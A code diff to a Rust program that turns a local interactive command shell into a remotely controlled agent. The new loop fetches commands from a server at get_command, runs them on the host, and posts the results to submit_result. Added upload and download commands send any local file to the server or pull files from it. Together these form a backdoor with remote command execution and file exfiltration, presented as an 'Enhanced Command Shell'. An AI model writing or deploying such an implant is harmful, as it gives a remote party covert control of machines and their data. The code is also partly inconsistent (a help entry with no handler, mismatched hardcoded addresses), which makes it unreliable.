@@ -1,69 +1,21 @@
-use std::io::{self, Write}; 
-use std::process::Command; 
-use std::path::Path;
+use std::io::{self, Read};
+use std::process::Command;
+use std::env;
 use std::fs;
-use std::time::SystemTime;
+use std::path::Path;
 
-#[derive(Debug)]
-enum OpCode {
-    Exec = 0x01,
-    Cd = 0x02,
-    Exit = 0x03,
-    Help = 0x04,
-    Tree = 0x05,
+async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
+    let output = Command::new(cmd)
+        .args(args)
+        .output()?;
+
+    Ok(format!("Exit Code: {}\nStdout:\n{}\nStderr:\n{}", 
+        output.status,
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)))
 }
 
-struct CommandLogger {
-    entries: Vec<(SystemTime, String)>,
-}
-
-impl CommandLogger {
-    fn new() -> Self {
-        CommandLogger {
-            entries: Vec::new(),
-        }
-    }
-
-    fn log(&mut self, command: &str) {
-        self.entries.push((SystemTime::now(), command.to_string()));
-        println!("[DEBUG] Logged command: {}", command);
-    }
-}
-
-#[derive(Debug)]
-enum ShellCommand {
-    Execute(String, Vec<String>),
-    ChangeDir(String),
-    Exit,
-    Help,
-    TreeView(String),
-}
-
-impl ShellCommand {
-    fn from_opcode(code: u8, args: &[u8]) -> Option<Self> {
-        match code {
-            0x01 => Some(ShellCommand::Execute(
-                String::from_utf8_lossy(&args[0..args.iter().position(|&x| x == 0).unwrap_or(args.len())]).to_string(),
-                Vec::new()
-            )),
-            0x02 => Some(ShellCommand::ChangeDir(
-                String::from_utf8_lossy(&args[0..args.iter().position(|&x| x == 0).unwrap_or(args.len())]).to_string()
-            )),
-            0x03 => Some(ShellCommand::Exit),
-            0x04 => Some(ShellCommand::Help),
-            0x05 => Some(ShellCommand::TreeView(".".to_string())),
-            _ => None,
-        }
-    }
-}
-
-/// Recursively displays a directory tree structure
-/// # Arguments
-/// * `path` - The starting path to display
-/// * `prefix` - The prefix to use for the current line (for formatting)
-/// * `is_last` - Whether this is the last item in the current directory
-/// # Returns
-/// * `io::Result<()>` - Success or error status
+// Add tree-related functions for fun
 fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
     let display = path.file_name()
         .unwrap_or_else(|| path.as_os_str())
@@ -78,7 +30,7 @@ fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
             .collect::<Result<Vec<_>, io::Error>>()?;
         
         for (i, entry) in entries.iter().enumerate() {
-            let new_prefix = format!("{}{}",
+            let new_prefix = format!("{}{}", 
                 prefix,
                 if is_last { "    " } else { "│   " }
             );
@@ -88,139 +40,122 @@ fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
     Ok(())
 }
 
-/// Parses user input into a shell command
-/// # Arguments
-/// * `input` - The raw string input from the user
-/// # Returns
-/// * `Option<ShellCommand>` - None if input is invalid, Some(command) if valid
-/// # Examples
-/// ```
-/// let cmd = parse_command("cd /home");
-/// assert!(matches!(cmd, Some(ShellCommand::ChangeDir(_))));
-/// ```
-fn parse_command(input: &str) -> Option<ShellCommand> {
-    let mut parts = input.split_whitespace(); // Split the input into parts
-    match parts.next()? {
-        "cd" => Some(ShellCommand::ChangeDir(parts.collect::<Vec<_>>().join(" "))),
-        "exit" => Some(ShellCommand::Exit),
-        "help" => Some(ShellCommand::Help),
-        "tree" => Some(ShellCommand::TreeView(
-            parts.next().unwrap_or(".").to_string()
-        )),
-        cmd => Some(ShellCommand::Execute(
-            cmd.to_string(),
-            parts.map(String::from).collect(),
-        )),
+async fn execute_command(parts: &[&str]) -> io::Result<String> {
+    match parts[0] {
+        "cd" => {
+            let path = parts.get(1).map(|s| *s).unwrap_or(".");
+            match env::set_current_dir(path) {
+                Ok(_) => Ok(format!("Changed directory to: {}", 
+                    env::current_dir()?.display())),
+                Err(e) => Ok(format!("Error: {}", e))
+            }
+        },
+        "pwd" => {
+            Ok(format!("Current directory: {}", env::current_dir()?.display()))
+        },
+        "upload" => {
+            let filename = parts.get(1)
+                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Missing filename"))?;
+            
+            // Read file
+            let content = fs::read(filename)?;
+            
+            // Upload file
+            match ureq::post("http://127.0.0.1:8080/upload")
+                .set("X-Filename", Path::new(filename).file_name()
+                    .and_then(|n| n.to_str())
+                    .unwrap_or(filename))
+                .send_bytes(&content) {
+                Ok(_) => Ok(format!("Successfully uploaded {}", filename)),
+                Err(e) => Ok(format!("Failed to upload {}: {}", filename, e))
+            }
+        },
+        "download" => {
+            let filename = parts.get(1)
+                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Missing filename"))?;
+            
+            // Download file
+            match ureq::get(&format!("http://127.0.0.1:8080/download/{}", filename))
+                .call() {
+                Ok(response) => {
+                    let bytes: Vec<u8> = response.into_reader()
+                        .bytes()
+                        .filter_map(|b| b.ok())
+                        .collect();
+                    
+                    let size = bytes.len();
+                    fs::write(filename, bytes)?;
+                    Ok(format!("Successfully downloaded {} ({} bytes)", filename, size))
+                },
+                Err(e) => Ok(format!("Failed to download {}: {}", filename, e))
+            }
+        },
+        "help" => {
+            Ok(format!("Available commands:\n\
+                cd (dir)        - Change directory\n\
+                pwd             - Print working directory\n\
+                tree            - Display directory tree\n\
+                upload (file)   - Upload file to server\n\
+                download (file) - Download file from server\n\
+                help            - Show this help\n\
+                (command)       - Execute system command"))
+        },
+        cmd => {
+            let output = Command::new(cmd)
+                .args(&parts[1..])
+                .current_dir(env::current_dir()?)
+                .output()?;
+
+            Ok(format!("{}{}",
+                String::from_utf8_lossy(&output.stdout),
+                String::from_utf8_lossy(&output.stderr)))
+        }
     }
 }
 
-/// Executes a parsed shell command
-/// # Arguments
-/// * `cmd` - The ShellCommand to execute
-/// * `logger` - The CommandLogger for logging commands
-/// # Effects
-/// * May change current directory (cd)
-/// * May spawn new processes (execute)
-/// * May print to stdout (help, tree)
-fn execute_shell_command(cmd: ShellCommand, logger: &mut CommandLogger) {
-    logger.log(&format!("{:?}", cmd));
-    
-    match cmd {
-        ShellCommand::Execute(program, args) => {
-            match Command::new(&program).args(&args).spawn() {
-                Ok(mut child) => { let _ = child.wait(); },
-                Err(e) => eprintln!("Error: {}", e),
-            }
-        },
-        ShellCommand::ChangeDir(dir) => {
-            if let Err(e) = std::env::set_current_dir(&dir) {
-                eprintln!("cd: {}", e);
-            }
-        },
-        ShellCommand::TreeView(path) => {
-            println!(".");
-            if let Err(e) = display_tree(Path::new(&path), "", true) {
-                eprintln!("Error displaying tree: {}", e);
-            }
-        },
-        ShellCommand::Help => {
-            println!("Available commands:");
-            println!("  cd <dir>  - Change directory");
-            println!("  help      - Show this help");
-            println!("  exit      - Exit the shell");
-            println!("  <command> - Execute command");
-            println!("  tree [dir] - Display directory tree");
-        },
-        ShellCommand::Exit => {},
-    }
+fn stdin_ready() -> io::Result<bool> {
+    let mut stdin = io::stdin();
+    let mut buf = [0u8; 1];
+    Ok(stdin.read(&mut buf)? > 0)
 }
 
-/// Main shell loop that handles user interaction
-/// # Effects
-/// * Continuously reads from stdin
-/// * Prints prompt to stdout
-/// * Executes commands
-/// * Maintains shell state until exit
-pub fn run_shell() {
-    let mut input = String::new();
-    let mut logger = CommandLogger::new();
-    
-    println!("Enhanced Command Shell (type 'help' for commands)");
-    
+// This is a simple command shell that allows for basic file operations and command execution.
+// It can change directories, upload and download files, and display a directory tree.
+// PRECONDITION: The server must be running and accessible at the specified address.
+// POSTCONDITION: The shell will exit when the user types 'exit'.
+pub async fn run_shell(server_addr: &str) -> io::Result<()> {
+    println!("Enhanced Command Shell started. Type 'help' for commands.");
+
+    // Initialize starting directory
+    let home_dir = dirs::home_dir()
+        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Could not determine home directory"))?;
+    env::set_current_dir(&home_dir)?;
+
     loop {
-        print!("{} > ", std::env::current_dir().unwrap().display());
-        io::stdout().flush().unwrap();
-        input.clear();
-        
-        if io::stdin().read_line(&mut input).is_err() {
-            break;
-        }
+        // Check for commands from server
+        if let Ok(response) = ureq::get(&format!("http://{}/get_command", server_addr)).call() {
+            if response.status() == 200 {
+                let command = response.into_string()?;
+                println!("Received command: {}", command);
+                
+                let parts: Vec<&str> = command.split_whitespace().collect();
+                if !parts.is_empty() {
+                    let output = match execute_command(&parts).await {
+                        Ok(out) => out,
+                        Err(e) => format!("Error: {}", e),
+                    };
 
-        // Try parsing as binary first
-        if let Some(bytes) = input.trim().as_bytes().first() {
-            if let Some(cmd) = ShellCommand::from_opcode(*bytes, &input.as_bytes()[1..]) {
-                match cmd {
-                    ShellCommand::Exit => break,
-                    cmd => execute_shell_command(cmd, &mut logger),
+                    // Send result back to server
+                    if let Err(e) = ureq::post(&format!("http://{}/submit_result", server_addr))
+                        .set("X-Command", &command)
+                        .send_string(&output) {
+                        eprintln!("Failed to send result: {}", e);
+                    }
                 }
-                continue;
             }
         }
 
-        // Fall back to text parsing
-        match parse_command(input.trim()) {
-            Some(ShellCommand::Exit) => break,
-            Some(cmd) => execute_shell_command(cmd, &mut logger),
-            None => if !input.trim().is_empty() {
-                eprintln!("Invalid command");
-            },
-        }
+        // Small delay to prevent excessive polling
+        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
     }
-}
-
-/// Unit tests for shell functionality
-#[cfg(test)]
-mod tests {
-    use super::*;
-    
-    #[test]
-    fn test_parse_command() {
-        if let Some(ShellCommand::Execute(cmd, args)) = parse_command("ls -la") {
-            assert_eq!(cmd, "ls");
-            assert_eq!(args, vec!["-la"]);
-        } else {
-            panic!("Failed to parse command");
-        }
-    }
-}
-
-/// Entry point for testing the shell directly
-/// # Effects
-/// * Starts the command shell
-/// * Handles user input until exit
-fn main() {
-    println!("Test interface for command shell");
-    println!("Type 'exit' to quit");
-    println!("Type 'help' for available commands");
-    run_shell();
 }
